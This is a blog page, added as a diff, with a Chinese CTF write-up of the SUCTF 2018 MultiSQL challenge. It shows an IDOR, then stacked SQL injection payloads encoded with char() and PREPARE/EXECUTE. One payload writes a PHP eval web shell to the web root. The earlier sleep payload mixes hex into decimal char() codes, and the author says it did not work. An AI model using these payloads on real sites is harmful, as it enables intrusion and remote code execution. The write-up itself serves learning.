@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>[SUCTF 2018]MultiSQL | Rock&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="[SUCTF 2018]MultiSQL页面源代码未发现异常，先扫一遍目录。  首先分析应用功能点和逻辑。 发现前端可用功能只有登录和注册，再结合题目名称，估计是有sql注入。 首先注册用户test&#x2F;1 完成后跳转至&#x2F;user&#x2F;user.php，可以  查看用户信息,通过修改请求id可越权查看admin用户的信息&#x2F;user&#x2F;user.php?id&#x3D;1 上传头像文件 退出登录   登录界面">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[SUCTF 2018]MultiSQL">
+<meta property="og:url" content="https://rock718.github.io.git/2022/03/24/SUCTF-2018-MultiSQL/index.html">
+<meta property="og:site_name" content="Rock&#39;s blog">
+<meta property="og:description" content="[SUCTF 2018]MultiSQL页面源代码未发现异常，先扫一遍目录。  首先分析应用功能点和逻辑。 发现前端可用功能只有登录和注册，再结合题目名称，估计是有sql注入。 首先注册用户test&#x2F;1 完成后跳转至&#x2F;user&#x2F;user.php，可以  查看用户信息,通过修改请求id可越权查看admin用户的信息&#x2F;user&#x2F;user.php?id&#x3D;1 上传头像文件 退出登录   登录界面">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://rock718.github.io.git/SUCTF-2018-MultiSQL/image-20220320170510563.png">
+<meta property="og:image" content="https://rock718.github.io.git/SUCTF-2018-MultiSQL/image-20220320172607124.png">
+<meta property="og:image" content="https://rock718.github.io.git/SUCTF-2018-MultiSQL/image-20220324102009333.png">
+<meta property="article:published_time" content="2022-03-24T02:24:12.000Z">
+<meta property="article:modified_time" content="2022-03-24T02:24:12.000Z">
+<meta property="article:author" content="Rock">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rock718.github.io.git/SUCTF-2018-MultiSQL/image-20220320170510563.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Rock&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Noto+Sans+KR:100,300,400,700&amp;subset=korean" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <!--<div id="banner"></div>-->
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        <a href="/" id="main-nav-title" class="main-nav-link">Rock&#39;s blog</a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives/">Archives</a>
+        
+          <a class="main-nav-link" href="/about/">about</a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-SUCTF-2018-MultiSQL" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      [SUCTF 2018]MultiSQL
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="SUCTF-2018-MultiSQL"><a href="#SUCTF-2018-MultiSQL" class="headerlink" title="[SUCTF 2018]MultiSQL"></a>[SUCTF 2018]MultiSQL</h2><p>页面源代码未发现异常，先扫一遍目录。</p>
+<p><img src="/SUCTF-2018-MultiSQL/image-20220320170510563.png" alt="image-20220320170510563"></p>
+<p>首先分析应用功能点和逻辑。</p>
+<p>发现前端可用功能只有登录和注册，再结合题目名称，估计是有sql注入。</p>
+<p>首先注册用户test&#x2F;1</p>
+<p>完成后跳转至<code>/user/user.php</code>，可以</p>
+<ul>
+<li>查看用户信息,通过修改请求id可越权查看admin用户的信息<code>/user/user.php?id=1</code></li>
+<li>上传头像文件</li>
+<li>退出登录</li>
+</ul>
+<p><img src="/SUCTF-2018-MultiSQL/image-20220320172607124.png" alt="image-20220320172607124"></p>
+<p>登录界面可以使用注册的账号登录。</p>
+<p>在简单手动测试登录和查看用户信息功能是否有sql注入后，发现在<code>/user/user.php?id=1</code>处存在数字型注入。</p>
+<p>在尝试通过基于时间的注入进行验证时，发现并没有预期的响应延迟。</p>
+<p>再结合题目名称，尝试结合预处理语句进行注入，发现基于时间的注入依旧不可行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=2;set+@sql=char(73,65,6c,65,63,74,20,73,6c,65,65,70,28,35,29,3b);prepare+query+from+@sql;execute+query;</span><br><span class="line">//select sleep(5);</span><br></pre></td></tr></table></figure>
+
+<p>通过查看wp，发现直接通过mysql写入文件是成功的，不知道为何。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=2;set+@sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare+query+from+@sql;execute+query;</span><br><span class="line">//select &#x27;&lt;?php eval($_POST[_]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>最后直接访问shell可以获取到根目录的flag文件内容。</p>
+<p><img src="/SUCTF-2018-MultiSQL/image-20220324102009333.png" alt="image-20220324102009333"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://rock718.github.io.git/2022/03/24/SUCTF-2018-MultiSQL/" data-id="cl9y4cx9j001i24fy7c086vl9" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/03/27/GXYCTF2019-BabysqliV3-0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <span class="article-nav-caption">Newer</span>
+      <div class="article-nav-title">
+        
+          [GXYCTF2019]BabysqliV3.0
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/03/20/SWPU2019-Web4/" id="article-nav-older" class="article-nav-link-wrap">
+      <span class="article-nav-caption">Older</span>
+      <div class="article-nav-title">[SWPU2019]Web4</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 Rock<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> with 
+      theme_by <a href="http://hexo.io/" target="_blank">mango</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives/" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about/" class="mobile-nav-link">about</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
